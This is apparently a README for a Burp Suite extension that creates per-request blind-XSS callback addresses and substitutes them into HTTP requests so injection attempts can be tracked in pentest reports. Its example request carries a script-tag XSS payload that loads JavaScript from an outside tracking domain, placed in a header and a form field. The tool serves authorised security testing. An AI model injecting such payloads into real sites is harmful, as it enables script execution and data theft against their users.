# What is the this tool for?

This tool can be used to generate relevant XSS addresses that can be used to track HTTP requests. By using this tool, all your injection attempts will be tracked and the reports you generate will include the full HTTP request in the final output.

# Setup

You can download the jar directly and load it into burpsuite.

After loading the plugin, a new tab will be created, as shown below.

<img width="1048" alt="image" src="https://user-images.githubusercontent.com/16237562/215692824-f1174bbc-d00d-4d7e-b5b0-dd171aae7ac9.png">

Just fill in the form and click Login.

`replace` is the javascript address that needs to be replaced.

For example (`replace` is `test123`)

```
GET /concat-us HTTP/1.1
Host: example.com
aaa: test123

content=testhello<script src="test123"></script>
```

Finally the extension will automatically update the request

```
GET /concat-us HTTP/1.1
Host: example.com
aaa: https://request-id-domain.xss.cl

content=testhello<script src="https://request-id-domain.xss.cl"></script>
```
